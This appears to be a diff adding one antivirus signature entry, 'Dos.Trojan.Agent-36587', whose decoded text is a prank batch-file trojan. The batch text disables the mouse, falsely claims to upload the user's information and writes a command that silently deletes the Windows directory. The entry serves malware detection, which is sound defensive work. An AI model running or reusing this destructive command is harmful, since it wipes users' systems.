@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36587
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off cls echo this is a virus. c:\windows\rudll32.exe mouse,disable pause echo please wait while this program uploads your information to another user. pause echo if you don't believe me then go look in your c:\ drive! md "c:\virus" cd "c:\virus echo rd/s/q "c:\windows" >> virus.bat pause echo ha ha ha ha ha!!!! exit 
